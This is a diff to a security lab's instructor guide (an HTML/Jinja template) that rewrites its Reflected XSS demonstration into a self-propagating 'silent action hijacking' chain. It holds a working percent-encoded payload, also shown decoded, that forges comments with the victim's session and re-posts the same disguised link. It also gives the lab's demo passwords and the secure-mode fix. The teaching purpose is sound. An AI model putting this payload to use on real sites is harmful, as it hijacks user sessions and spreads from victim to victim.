@@ -55,8 +55,9 @@
                     <h1>Security Laboratory Demonstration Guide</h1>
                     <p class="lab-description">
                         Reference manual for instructors and presenters. Use this guide to walk through reproducible
-                        demonstrations of the SQL Injection Full Attack Chain (Reconnaissance to Account Takeover) and
-                        Stored Cross-Site Scripting (In-Session Phishing).
+                        demonstrations of the SQL Injection Full Attack Chain (Reconnaissance to Account Takeover),
+                        Stored Cross-Site Scripting (In-Session Phishing), and Reflected Cross-Site Scripting
+                        (Silent Action Hijacking).
                     </p>
                 </div>
             </header>
@@ -64,7 +65,7 @@
             <nav class="lab-toc">
                 <a href="#sqli" class="toc-badge">1. SQL Injection (Full Attack Chain)</a>
                 <a href="#xss" class="toc-badge">2. Stored Cross-Site Scripting (XSS)</a>
-                <a href="#rxss" class="toc-badge">3. Reflected XSS (Phishing Link Delivery)</a>
+                <a href="#rxss" class="toc-badge">3. Reflected XSS (Silent Action Hijacking)</a>
             </nav>
 
             <!-- 1. SQL Injection Full Attack Chain -->
@@ -232,50 +233,123 @@
             <section class="lab-card" id="rxss">
                 <div class="lab-card-header">
                     <span class="vulnerability-tag">CWE-79</span>
-                    <h2>3. Reflected XSS — Phishing Link Delivery via Comment</h2>
+                    <h2>3. Reflected XSS — Silent Action Hijacking (Forced Comment)</h2>
                 </div>
                 <div class="lab-card-body">
-                    <p><strong>Description &amp; Root Cause:</strong> The search results page reflects the
-                        <code>q</code> query parameter directly into the HTML response without escaping.
-                        A crafted URL containing an HTML/JavaScript payload executes in the victim's
-                        browser the moment they click the link — without storing anything in the database.
-                        Unlike Stored XSS, Reflected XSS requires the attacker to deliver the malicious
-                        URL to the victim through a social engineering channel.
+                    <p><strong>Description &amp; Root Cause:</strong> The search results banner reflects the
+                        <code>q</code> query parameter directly into the HTML response using Jinja2's
+                        <code>| safe</code> filter without output encoding. A crafted URL containing an HTML/JavaScript
+                        payload executes in the victim's browser the moment they open the link — without storing the
+                        script in the database.
                     </p>
-                    <p><strong>Target Feature:</strong> Post Search — <code>/?q=&lt;payload&gt;</code>
-                        reflected in the "Showing results for:" banner on the home page.</p>
+                    <p><strong>Why HttpOnly Does Not Stop This:</strong> The application sets
+                        <code>SESSION_COOKIE_HTTPONLY = True</code>, so JavaScript cannot read
+                        <code>document.cookie</code>. However, same-origin <code>fetch()</code> requests executed by
+                        injected JavaScript automatically attach the victim's <code>HttpOnly</code> session cookie,
+                        allowing the attacker to silently forge authenticated actions (posting a comment under the
+                        victim's identity).
+                    </p>
+                    <p><strong>Target Feature:</strong> Post Search — <a href="{{ blog_url('/') }}"
+                            target="_blank"><code>:5000/?q=&lt;payload&gt;</code></a> reflected in the
+                        "Showing results for:" banner, targeting <code>POST /posts/2/comments</code>.</p>
+                    <p><strong>Prerequisites:</strong> Toggle mode to <strong>Vulnerable Mode</strong>, and ensure the
+                        victim browser session is signed in on the blog (e.g., <code>bob</code> / <code>bob123</code>).
+                    </p>
 
-                    <h3>Crafted Comment Payload</h3>
-                    <p>This comment embeds an anchor that hides the malicious URL behind natural anchor
-                        text. The URL is percent-encoded so the raw
-                        <code>&lt;script&gt;</code> tag is never visible in the comment text:
-                    </p>
+                    <h3>Demonstration Steps (Self-Propagating Chain)</h3>
+                    <ol>
+                        <li>In Tab A (Attacker), sign in as <code>alice</code> (<code>alice123</code>) and paste the
+                            persuasive comment payload into <a href="{{ blog_url('/posts/1#comments') }}"
+                                target="_blank"><code>/posts/1#comments</code></a> (or skip to step 2 using the
+                            Direct Crafted URL).</li>
+                        <li>In Tab B / Incognito (Victim 1), sign in as <code>bob</code> (<code>bob123</code>), open
+                            <code>/posts/1</code>, and click <code>alice</code>'s link
+                            <em>"🔥 Top 10 Rust performance tips (must read)"</em>.
+                        </li>
+                        <li>Victim 1 briefly hits <code>/?q=rust&lt;script&gt;...</code>, which silently posts a
+                            natural-looking recommendation comment on <a href="{{ blog_url('/posts/2#comments') }}"
+                                target="_blank">Post #2</a> under <code>@bob</code> — <strong>carrying the exact same
+                                disguised trap link</strong> — then redirects <code>bob</code> to
+                            <code>/?q=rust</code>.
+                        </li>
+                        <li>Now sign in as another user (Victim 2, e.g., <code>admin</code> / <code>admin123</code>)
+                            and visit <a href="{{ blog_url('/posts/2#comments') }}"
+                                target="_blank"><code>/posts/2#comments</code></a>. Victim 2 sees trusted teammate
+                            <code>@bob</code> recommending the link, clicks it, and unwittingly spreads the forged
+                            comment under <code>@admin</code> as well!</li>
+                    </ol>
+
+                    <h3>Copyable Demonstration Payloads</h3>
 
                     <div class="copy-box">
-                        <label>Comment Payload (Paste into Comment Box — Vulnerable Mode only):</label>
+                        <label>Option A — Comment Delivery Payload (Paste into <code>/posts/1</code> Comment Box):</label>
                         <div class="copy-input-row">
-                            <input type="text" readonly
-                                value='<a href="/?q=rust+tips%22%3E%3Cscript%3Ealert(%22Reflected+XSS%3A+cookie%3D%22+%2B+document.cookie)%3C%2Fscript%3E%3Cspan+class%3D%22">🔥 Top 10 Rust performance tips (must read)</a>'
-                                class="copy-field" id="payload-rxss-comment">
+                            <textarea readonly class="copy-field copy-field-multiline" id="payload-rxss-comment"
+                                rows="3">Great post! If you work with systems code, don't miss this benchmark summary: &lt;a href="/?q=rust%3Cscript%3Evar%20u%3D%22%2F%3Fq%3D%22%2BencodeURIComponent%28new%20URLSearchParams%28location.search%29.get%28%22q%22%29%29%3Bfetch%28%22%2Fposts%2F2%2Fcomments%22%2C%7Bmethod%3A%22POST%22%2Cbody%3Anew%20URLSearchParams%28%7Bcontent%3A%60Solid%20breakdown%21%20Also%20check%20out%20these%20benchmarks%3A%20%3Ca%20href%3D%22%24%7Bu%7D%22%3E%F0%9F%94%A5%20Top%2010%20Rust%20performance%20tips%20%28must%20read%29%3C%2Fa%3E%60%7D%29%7D%29.then%28function%28%29%7Blocation.replace%28%22%2F%3Fq%3Drust%22%29%7D%29%3C%2Fscript%3E"&gt;🔥 Top 10 Rust performance tips (must read)&lt;/a&gt;</textarea>
                             <button type="button" class="btn btn-secondary btn-copy"
                                 data-target="payload-rxss-comment">Copy</button>
                         </div>
-                        <small class="form-hint">In Vulnerable Mode the comment renders raw HTML.
-                            The victim sees only the anchor text — the malicious URL is hidden behind it.</small>
+                        <small class="form-hint">In Vulnerable Mode the comment renders as normal prose with an
+                            enticing anchor link; the percent-encoded script in <code>href</code> stays hidden until
+                            clicked, and each victim's forged comment re-embeds the exact same trap link.</small>
                     </div>
 
                     <div class="copy-box">
-                        <label>Direct Crafted URL (Alternative — paste into Tab B address bar to skip the comment
-                            step):</label>
+                        <label>Option B — Direct Crafted URL (Paste directly into Victim browser address bar):</label>
                         <div class="copy-input-row">
                             <input type="text" readonly
-                                value='/?q=rust+tips"><script>alert("Reflected XSS: cookie=" + document.cookie)</script><span class="'
+                                value="{{ blog_url('/?q=rust%3Cscript%3Evar%20u%3D%22%2F%3Fq%3D%22%2BencodeURIComponent%28new%20URLSearchParams%28location.search%29.get%28%22q%22%29%29%3Bfetch%28%22%2Fposts%2F2%2Fcomments%22%2C%7Bmethod%3A%22POST%22%2Cbody%3Anew%20URLSearchParams%28%7Bcontent%3A%60Solid%20breakdown%21%20Also%20check%20out%20these%20benchmarks%3A%20%3Ca%20href%3D%22%24%7Bu%7D%22%3E%F0%9F%94%A5%20Top%2010%20Rust%20performance%20tips%20%28must%20read%29%3C%2Fa%3E%60%7D%29%7D%29.then%28function%28%29%7Blocation.replace%28%22%2F%3Fq%3Drust%22%29%7D%29%3C%2Fscript%3E') }}"
                                 class="copy-field" id="payload-rxss-url">
                             <button type="button" class="btn btn-secondary btn-copy"
                                 data-target="payload-rxss-url">Copy</button>
                         </div>
-                        <small class="form-hint">Paste directly into the browser address bar to trigger
-                            without needing the comment delivery step.</small>
+                        <small class="form-hint">Decoded payload executed on reflection:
+                            <code>rust&lt;script&gt;var u="/?q="+encodeURIComponent(new URLSearchParams(location.search).get("q"));fetch("/posts/2/comments",{method:"POST",body:new URLSearchParams({content:`Solid breakdown! Also check out these benchmarks: &lt;a href="${u}"&gt;🔥 Top 10 Rust performance tips (must read)&lt;/a&gt;`})}).then(function(){location.replace("/?q=rust")})&lt;/script&gt;</code>
+                        </small>
+                    </div>
+
+                    <h4>Expected Behavior &amp; Countermeasure Comparison</h4>
+                    <table class="guide-steps-table">
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>Stored XSS (Section 2)</th>
+                                <th>Reflected XSS (Section 3)</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Payload Storage</strong></td>
+                                <td>Persisted in SQLite <code>comments</code> table</td>
+                                <td>Not stored; delivered in URL parameter <code>?q=</code></td>
+                            </tr>
+                            <tr>
+                                <td><strong>Affected Victims</strong></td>
+                                <td>Every user who visits <code>/posts/1</code></td>
+                                <td>Only users tricked into opening the crafted link</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Demonstrated Impact</strong></td>
+                                <td>Fake login modal steals password to C2 panel</td>
+                                <td>Silent <code>fetch()</code> forges comment despite <code>HttpOnly</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <p><strong>Vulnerable Mode:</strong> <code>app/templates/blog/index.html</code> renders
+                        <code>{% raw %}{{ query | safe }}{% endraw %}</code>, executing the injected script and silently
+                        submitting a comment as the logged-in victim before redirecting to <code>/?q=rust</code>.
+                    </p>
+                    <p><strong>Secure Mode:</strong> Jinja2 context-aware auto-escaping
+                        (<code>{% raw %}{{ query }}{% endraw %}</code>) encodes <code>&lt;script&gt;</code> into
+                        harmless HTML entities. The payload renders as plain text, no JavaScript runs, and no forged
+                        comment is created.
+                    </p>
+
+                    <div class="source-ref">
+                        <strong>Source Code Reference:</strong> <code>app/templates/blog/index.html</code> (line 30-42),
+                        <code>app/routes/blog.py:index()</code>, <code>app/routes/blog.py:add_comment()</code> &amp;
+                        <code>app/config.py:Config.SESSION_COOKIE_HTTPONLY</code>
                     </div>
                 </div>
             </section>
